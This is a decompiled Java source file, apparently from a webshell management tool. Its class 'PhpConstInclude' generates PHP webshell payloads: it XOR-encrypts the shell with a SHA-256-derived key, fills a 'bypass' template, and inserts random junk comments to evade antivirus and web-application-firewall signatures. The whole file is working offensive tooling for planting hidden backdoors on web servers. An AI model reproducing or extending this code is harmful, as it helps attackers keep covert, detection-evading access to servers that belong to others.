//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package core.shellprocessor.phpInclude;

import core.annotation.GenerateProcessor;
import core.imp.ShellProcessor;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import shells.cryptions.phpXor.Generate;
import util.Log;
import util.functions;

@GenerateProcessor(
    DisplayName = "PHP 全版本常量文件包含（include_once）",
    superTemplate = {"php"}
)
public class PhpConstInclude implements ShellProcessor {
    private static final String CHARS = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|";
    private static final String UPPER_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    private static final SecureRandom RANDOM = new SecureRandom();

    public PhpConstInclude() {
    }

    public static String generateRandomString(Boolean isUpper) {
        int length = RANDOM.nextInt(7) + 10;
        StringBuilder sb = new StringBuilder();
        int i;
        int index;
        if (isUpper) {
            for(i = 0; i < length; ++i) {
                index = RANDOM.nextInt("ABCDEFGHIJKLMNOPQRSTUVWXYZ".length());
                sb.append("ABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(index));
            }

            return sb.toString();
        } else {
            for(i = 0; i < length; ++i) {
                index = RANDOM.nextInt("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|".length());
                sb.append("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|".charAt(index));
            }

            return "/*" + sb.toString() + "*/";
        }
    }

    public static String xorEncrypt(String data, String key) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] keyBytes = digest.digest(key.getBytes(StandardCharsets.UTF_8));
        byte[] dataBytes = data.getBytes(StandardCharsets.UTF_8);
        byte[] encrypted = new byte[dataBytes.length];

        for(int i = 0; i < dataBytes.length; ++i) {
            encrypted[i] = (byte)(dataBytes[i] ^ keyBytes[i % keyBytes.length]);
        }

        return Base64.getEncoder().encodeToString(encrypted);
    }

    public static String BypassReplace(String data, String pass) {
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/templatebypass.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            data = code.replace("8WRl51GXKPkn8kusti7u8M8zWg==", xorEncrypt(data, pass));
            data = data.replace("MYPATH", generateRandomString(true));
            String target = "/*zs*/";
            StringBuilder result = new StringBuilder(data);

            for(int startIndex = 0; (startIndex = result.indexOf(target, startIndex)) != -1; ++startIndex) {
                result.replace(startIndex, startIndex + target.length(), generateRandomString(false));
            }

            data = result.toString();
        } catch (Exception var7) {
            Log.error(var7);
        }

        return data;
    }

    public byte[] doProcessor(byte[] shell, String suffix) {
        return new byte[0];
    }

    public byte[] doProcessor(byte[] shell, String suffix, String pass) {
        return BypassReplace(new String(shell), pass).getBytes();
    }
}
